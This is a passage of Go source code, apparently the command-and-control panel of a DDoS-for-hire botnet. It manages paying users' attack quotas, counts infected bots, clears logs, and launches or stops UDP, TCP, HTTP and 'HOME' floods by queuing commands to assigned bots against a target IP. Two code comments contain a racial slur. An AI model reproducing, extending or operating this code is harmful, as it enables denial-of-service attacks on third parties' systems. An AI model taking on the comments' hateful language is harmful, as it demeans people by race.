                            this.writePrompt(fmt.Sprintf("\x1b[31mFailed to modify %s for user %s: %s\x1b[0m\r\n", attribute, username, dbErr.Error()))
                        } else {
                            this.writePrompt(fmt.Sprintf("\x1b[38;5;117m%s modified successfully for user %s\x1b[0m\r\n", attribute, username))
                        }
                    }
                } else if attribute == "cons" || attribute == "maxtime" || attribute == "cooldown" || attribute == "days" || attribute == "daily" {
                    // Special case: reset daily attack count
                    if attribute == "daily" && action == "reset" {
                        dbData, err := database.readUsers()
                        if err != nil {
                            this.writePrompt(fmt.Sprintf("\x1b[31mFailed to read database: %s\x1b[0m\r\n", err.Error()))
                            continue
                        }
                        now := time.Now().Unix()
                        for _, username := range usernames {
                            found := false
                            for i, user := range dbData.Users {
                                if user.Username == username {
                                    dbData.Users[i].DailyAttackCount = 0
                                    dbData.Users[i].LastResetTime = now
                                    found = true
                                    break
                                }
                            }
                            if !found {
                                this.writePrompt(fmt.Sprintf("\x1b[31mUser %s not found\x1b[0m\r\n", username))
                                continue
                            }
                        }
                        dbErr := database.writeUsers(dbData)
                        if dbErr != nil {
                            this.writePrompt(fmt.Sprintf("\x1b[31mFailed to update database: %s\x1b[0m\r\n", dbErr.Error()))
                        } else {
                            for _, username := range usernames {
                                this.writePrompt(fmt.Sprintf("\x1b[38;5;117mDaily attack count reset successfully for user %s\x1b[0m\r\n", username))
                            }
                        }
                    } else {
                        // Validate action for numeric attributes
                        if action != "add" && action != "remove" && action != "set" {
                            this.writePrompt("\x1b[31mAction must be 'add', 'remove', 'set', or 'reset' (for daily only) for cons, maxtime, cooldown, days, or daily\x1b[0m\r\n")
                            continue
                        }

                        // Ensure amount is provided
                        if len(parts) != 6 {
                            this.writePrompt("\x1b[31mUsage: users edit <username|*> <cons|maxtime|cooldown|days|daily> <add|remove|set> <amount>\x1b[0m\r\n")
                            continue
                        }

                        amountStr := parts[5]
                        amount, err := strconv.Atoi(amountStr)
                        if err != nil {
                            this.writePrompt("\x1b[31mInvalid amount\x1b[0m\r\n")
                            continue
                        }
                        if action == "remove" {
                            amount = -amount
                        }

                        // Process each target username
                        for _, username := range usernames {
                            var dbErr error
                            switch attribute {
                            case "cons":
                                if action == "set" {
                                    dbErr = database.SetUserConns(username, amount)
                                } else {
                                    dbErr = database.ModifyUserConns(username, amount)
                                }
                            case "maxtime":
                                if action == "set" {
                                    dbErr = database.SetUserDurationLimit(username, amount)
                                } else {
                                    dbErr = database.ModifyUserDurationLimit(username, amount)
                                }
                            case "cooldown":
                                if action == "set" {
                                    dbErr = database.SetUserCooldown(username, amount)
                                } else {
                                    dbErr = database.ModifyUserCooldown(username, amount)
                                }
                            case "days":
                                user, err := database.GetUserInfo(username)
                                if err != nil {
                                    this.writePrompt(fmt.Sprintf("\x1b[31mFailed to get user %s: %s\x1b[0m\r\n", username, err.Error()))
                                    continue
                                }
                                if (action == "add" || action == "remove") && user.Expiry == 0 {
                                    this.writePrompt(fmt.Sprintf("\x1b[38;5;117mSkipped user %s: Cannot %s days for never-expiry plan\x1b[0m\r\n", username, action))
                                    continue
                                }
                                if action == "set" {
                                    dbErr = database.SetUserDays(username, amount)
                                } else {
                                    dbErr = database.AddDaysToUser(username, amount)
                                }
                            case "daily":
                                if action == "set" {
                                    dbErr = database.SetUserDailyAttackMax(username, amount)
                                } else {
                                    dbErr = database.ModifyUserDailyAttackMax(username, amount)
                                }
                            }
                            if dbErr != nil {
                                this.writePrompt(fmt.Sprintf("\x1b[31mFailed to modify %s for user %s: %s\x1b[0m\r\n", attribute, username, dbErr.Error()))
                            } else {
                                this.writePrompt(fmt.Sprintf("\x1b[38;5;117m%s modified successfully for user %s\x1b[0m\r\n", attribute, username))
                            }
                        }
                    }
                } else {
                    this.writePrompt("\x1b[31mUsage: users edit <username|*> <cons|maxtime|cooldown|days|daily|api|admin|powersaving_bypass|password> <add|remove|set|true|false|reset> [...]\x1b[0m\r\n")
                }

            default:
                this.writePrompt("\x1b[31mUnknown subcommand. Usage: users <add|remove|ban|unban|kick|list|edit> [...]\x1b[0m\r\n")
            }

        case "count":
            if !userInfo.Admin {
                this.writePrompt("\x1b[31mAdmin access required\x1b[0m\r\n")
                continue
            }

            this.conn.Write([]byte("\033[2J\033[1;1H")) // Clear screen
            this.conn.Write([]byte("\x1b[38;5;135m                       Bot Count Statistics\r\n"))

            // Get bot type distribution
            typeCounts := clientList.Distribution()
            totalBots := clientList.Count()
            availableCounts := make(map[string]int)

            // Count available bots per type
            database.mutex.Lock()
            for botID, available := range database.availableBots {
                if available {
                    if bot, exists := clientList.clients[botID]; exists {
                        availableCounts[bot.source]++
                    }
                }
            }
            database.mutex.Unlock()

            // Create a slice of bot type stats
            type botStat struct {
                botType    string
                total      int
                available  int
                percentage float64
            }

            var stats []botStat
            for botType, total := range typeCounts {
                available := availableCounts[botType]
                percentage := 0.0
                if totalBots > 0 {
                    percentage = (float64(total) / float64(totalBots)) * 100
                }
                stats = append(stats, botStat{
                    botType:    botType,
                    total:      total,
                    available:  available,
                    percentage: percentage,
                })
            }

            // Sort by percentage descending
            sort.Slice(stats, func(i, j int) bool {
                return stats[i].percentage > stats[j].percentage
            })

            // Display table header
            this.conn.Write([]byte("\x1b[38;5;231mType         | Total | Available | Percentage\r\n"))
            this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-----------|-----------\r\n"))

            // Display each bot type
            for _, s := range stats {
                line := fmt.Sprintf("\x1b[38;5;231m%-12s | %-5d | %-9d | %.2f%%\r\n", s.botType, s.total, s.available, s.percentage)
                this.conn.Write([]byte(line))
            }

            // Display overall totals
            totalAvailable := 0
            for _, count := range availableCounts {
                totalAvailable += count
            }

            this.conn.Write([]byte("\x1b[38;5;231m-------------|-------|-----------|-----------\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mTotal        | \x1b[38;5;27m%-5d\x1b[0m | \x1b[38;5;27m%-9d\x1b[0m | \x1b[38;5;27m100.00%%\x1b[0m\r\n", totalBots, totalAvailable)))
            this.conn.Write([]byte("\r\n"))
            continue


        case "logs":
            if !userInfo.Admin {
                this.writePrompt("\x1b[31mAdmin access required\x1b[0m\r\n")
                continue
            }
            parts := strings.Fields(cmd)
            if len(parts) < 2 {
                this.writePrompt("\x1b[31mUsage: logs <enable|disable|clear>\x1b[0m\r\n")
                continue
            }
            subcommand := strings.ToLower(parts[1])
            switch subcommand {
            case "enable":
                err := database.EnableLogs()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError enabling logs: %s\x1b[0m\r\n", err.Error()))
                } else {
                    this.writePrompt("\x1b[38;5;117mLogs enabled\x1b[0m\r\n")
                }
            case "disable":
                err := database.DisableLogs()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError disabling logs: %s\x1b[0m\r\n", err.Error()))
                } else {
                    this.writePrompt("\x1b[38;5;117mLogs disabled\x1b[0m\r\n")
                }
            case "clear":
                err = database.ClearLogs()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError clearing logs: %s\x1b[0m\r\n", err.Error()))
                } else {
                    this.writePrompt("\x1b[38;5;117mLogs cleared\x1b[0m\r\n")
                }
            default:
                this.writePrompt("\x1b[31mInvalid subcommand: use enable, disable, or clear\x1b[0m\r\n")
            }

        default:
            // Handle stop command (available to all users)
            if cmd == "stop" {
                database.mutex.Lock()
                var botsToStop []int
                currentTime := time.Now().Unix()
                var remainingAttacks []AttackRecord
                for _, attack := range database.attacks {
                    if attack.Username == username && attack.StartTime+int64(attack.Duration) > currentTime {
                        botsToStop = append(botsToStop, attack.AssignedBotUIDs...)
                        for _, uid := range attack.AssignedBotUIDs {
                            database.availableBots[uid] = true
                        }
                    } else {
                        remainingAttacks = append(remainingAttacks, attack)
                    }
                }
                database.attacks = remainingAttacks
                database.mutex.Unlock()

                if len(botsToStop) > 0 {
                    stopCmd := "stop"
                    atk, _, err := NewAttack(stopCmd, userInfo.Admin)
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mError creating stop command: %s\x1b[0m\r\n", err))
                        continue
                    }
                    buf, err := atk.Build()
                    if err != nil {
                        this.writePrompt(fmt.Sprintf("\x1b[31mError building stop command: %s\x1b[0m\r\n", err))
                        continue
                    }
                    clientList.QueueBuf(buf, botsToStop, "")
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mYour running attacks stopped, sent to %d bots\x1b[0m\r\n", len(botsToStop))))
                } else {
                    this.conn.Write([]byte("\x1b[38;5;231mNo running attacks to stop\x1b[0m\r\n"))
                }
                continue
            }

            // Handle stopall command (admin only)
            if cmd == "stopall" {
                if !userInfo.Admin {
                    this.writePrompt("\x1b[31mAdmin access required for stopall command\x1b[0m\r\n")
                    continue
                }
                database.mutex.Lock()
                allBots := []int{}
                for _, attack := range database.attacks {
                    allBots = append(allBots, attack.AssignedBotUIDs...)
                    for _, uid := range attack.AssignedBotUIDs {
                        database.availableBots[uid] = true
                    }
                }
                database.attacks = nil
                database.mutex.Unlock()

                stopCmd := "stop"
                atk, _, err := NewAttack(stopCmd, userInfo.Admin)
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError creating stop command: %s\x1b[0m\r\n", err))
                    continue
                }
                buf, err := atk.Build()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31mError building stop command: %s\x1b[0m\r\n", err))
                    continue
                }
                clientList.QueueBuf(buf, allBots, "")
                this.conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231mAll running attacks stopped, sent to %d bots\x1b[0m\r\n", len(allBots))))
                continue
            }

            // Show method-specific help (e.g., udp ?)
            fields := strings.Fields(cmd)
            if len(fields) == 2 && fields[1] == "?" {
                method := strings.ToLower(fields[0])
                atkInfo, exists := attackInfoLookup[method]
                if !exists {
                    this.writePrompt(fmt.Sprintf("\x1b[31mInvalid attack method: %s\x1b[0m\r\n", method))
                    continue
                }

                var b strings.Builder

                // === Header ===
                b.WriteString(fmt.Sprintf("\r\n\x1b[38;5;135m=== Flags for %s ===\r\n\r\n\x1b[0m", method))

                // Group flags by flagID to handle synonyms
                flagGroups := make(map[uint8][]string)
                for name, info := range flagInfoLookup {
                    if uint8InSlice(info.flagID, atkInfo.attackFlags) {
                        flagGroups[info.flagID] = append(flagGroups[info.flagID], name)
                    }
                }

                // Display grouped flags
                for _, names := range flagGroups {
                    // Sort synonyms so order is stable
                    sort.Strings(names)

                    // Find description from any synonym
                    var description string
                    for _, name := range names {
                        if info, ok := flagInfoLookup[name]; ok {
                            description = info.flagDescription
                            break
                        }
                    }

                    // Build colored name list: purple names, white slashes
                    var parts []string
                    for i, name := range names {
                        if i > 0 {
                            parts = append(parts, "\x1b[38;5;231m/\x1b[38;5;135m")
                        }
                        parts = append(parts, name)
                    }
                    flagNames := "\x1b[38;5;135m" + strings.Join(parts, "") + "\x1b[38;5;231m"

                    b.WriteString(fmt.Sprintf("%s: %s\r\n", flagNames, description))
                }

                b.WriteString("\x1b[38;5;135mbots\x1b[38;5;231m: Number of bots to use for the attack\r\n")


                // Example usage
                b.WriteString(fmt.Sprintf(
                    "\r\n\x1b[38;5;231mExamples:\r\n"+
                        "  \x1b[38;5;27m%s 70.70.70.70 60 port=80 bots=100\r\n"+
                        "  \x1b[38;5;27m%s 70.70.70.75 30 size=1024\x1b[0m\r\n\r\n",
                    method, method,
                ))

                this.writePrompt(b.String())
                continue
            }



            // Handle attack commands (e.g., udp, tcp)
            atk, specifiedBots, err := NewAttack(cmd, userInfo.Admin)
            if err != nil {
                this.writePrompt("\x1b[31mInvalid command or attack method\x1b[0m\r\n")
                continue
            }

            if atk.Type == 18 && !userInfo.Admin {
                this.writePrompt("\x1b[31mOnly admins can launch HTTP attacks!!!\x1b[0m\r\n")
                continue
            }

            if atk.Type == 19 && !userInfo.Admin {
                this.writePrompt("\x1b[31mOnly admins can launch HOME attacks!!!\x1b[0m\r\n")
                continue
            }

            // Determine bot count with global attack cap
            database.mutex.Lock()
            availableBots := len(database.availableBots)
            maxBotsPerAttack := availableBots
            if database.globalMaxConcurrentAttacks > 0 {
                maxBotsPerAttack = availableBots / database.globalMaxConcurrentAttacks
            }
            database.mutex.Unlock()

            var botCount int
            if specifiedBots > 0 {
                if userInfo.MaxBots == -1 {
                    if specifiedBots == -1 {
                        botCount = maxBotsPerAttack
                    } else {
                        botCount = min(specifiedBots, maxBotsPerAttack)
                    }
                } else {
                    botCount = min(specifiedBots, userInfo.MaxBots)
                }
            } else if userInfo.MaxBots == -1 {
                botCount = maxBotsPerAttack
            } else {
                botCount = userInfo.MaxBots
            }

            // powersaving check for rich niggers
            if !userInfo.PowersavingBypass {
                targetIP := extractTarget(cmd)
                database.mutex.Lock()
                currentTime := time.Now().Unix()
                conflict := false
                for _, attack := range database.attacks {
                    if attack.StartTime+int64(attack.Duration) > currentTime && extractTarget(attack.Command) == targetIP {
                        conflict = true
                        break
                    }
                }
                database.mutex.Unlock()
                if conflict && !userInfo.Admin {
                    this.writePrompt("\x1b[31mError: An attack is already active on this IP\x1b[0m\r\n")
                    continue
                }
            }

            // Launch the attack
            can, assignedBots, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount)
            if !can {
                this.writePrompt(fmt.Sprintf("\x1b[31m%s\x1b[0m\r\n", err))
                continue
            }

            if !database.ContainsWhitelistedTargets(&AttackRecord{Command: cmd}) {
                buf, err := atk.Build()
                if err != nil {
                    this.writePrompt(fmt.Sprintf("\x1b[31m%s\x1b[0m\r\n", err))
                    continue
                }
                clientList.QueueBuf(buf, assignedBots, "") // using "" for bot category
                this.writePrompt(fmt.Sprintf("\x1b[38;5;117mAttack sent to %d bots\x1b[0m\r\n", len(assignedBots)))
            } else {
                fmt.Println("\x1b[31mBlocked Attack By " + username + " To Whitelisted Prefix\x1b[0m")
                this.writePrompt("\x1b[31mCannot attack whitelisted target\x1b[0m\r\n")
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    const MAX_INPUT_LENGTH = 1024
    var buf []byte

    for {
        var b [1]byte
        n, err := this.conn.Read(b[:])
        if err != nil {
            if err == io.EOF {
                return "", nil
            }
            log.Printf("ReadLine error for %s: %v", this.conn.RemoteAddr(), err)
            return "", err
        }

        if n != 1 {
            log.Printf("ReadLine: no bytes read for %s", this.conn.RemoteAddr())
            continue
        }

        c := b[0]

        switch c {
        case '\xFF':
            // Handle telnet commands - read 2 more bytes
            var cmd [2]byte
            if _, err := io.ReadFull(this.conn, cmd[:]); err != nil {
                log.Printf("Error reading telnet command for %s: %v", this.conn.RemoteAddr(), err)
                return "", err
            }
            // Ignore telnet commands, continue reading

        case '\x7F', '\x08': // Backspace/Delete
            if len(buf) > 0 {
                this.conn.Write([]byte("\b \b"))
                buf = buf[:len(buf)-1]
            }

        case '\r', '\t':
            // Ignore carriage return and tab

        case '\n', '\x00': // Line feed or null - end of input
            this.conn.Write([]byte("\r\n"))
            return string(buf), nil

        case 0x03:

        default:
            // Buffer overflow nigger
            if len(buf) >= MAX_INPUT_LENGTH {
                this.conn.Write([]byte("\r\n\x1b[31mNice try skid\x1b[0m\r\n"))
                time.Sleep(time.Duration(1000) * time.Millisecond)
                return "", fmt.Errorf("input exceeds maximum length")
            }

            // Handle escape sequences more securely
            if c == '\x1B' {
                // Read the next character to see if it's part of an escape sequence
                var next [1]byte
                this.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
                n, err := this.conn.Read(next[:])
                this.conn.SetReadDeadline(time.Time{}) // Reset deadline

                if err != nil || n != 1 {
                    // Timeout or error - treat as standalone escape
                    if len(buf) < MAX_INPUT_LENGTH-2 {
                        buf = append(buf, '^', '[')
                        this.conn.Write([]byte("^["))
                    }
                } else {
                    // It's an escape sequence, consume it but don't add to buffer
                    if next[0] == '[' {
                        // ANSI escape sequence, consume until we get a letter
                        for {
                            var seqByte [1]byte
                            this.conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
                            n, err := this.conn.Read(seqByte[:])
                            this.conn.SetReadDeadline(time.Time{})

                            if err != nil || n != 1 {
                                break
                            }

                            // ANSI sequences end with a letter (A-Z, a-z)
                            if (seqByte[0] >= 'A' && seqByte[0] <= 'Z') || 
                               (seqByte[0] >= 'a' && seqByte[0] <= 'z') {
                                break
                            }
                        }
                    }
                    // Ignore the entire escape sequence
                }
            } else if c >= 32 && c <= 126 { // Printable ASCII characters only
                buf = append(buf, c)
                if masked {
                    this.conn.Write([]byte("*"))
                } else {
                    this.conn.Write(b[:])
                }
            }
            // Ignore non-printable characters (except those handled above)
        }
    }
}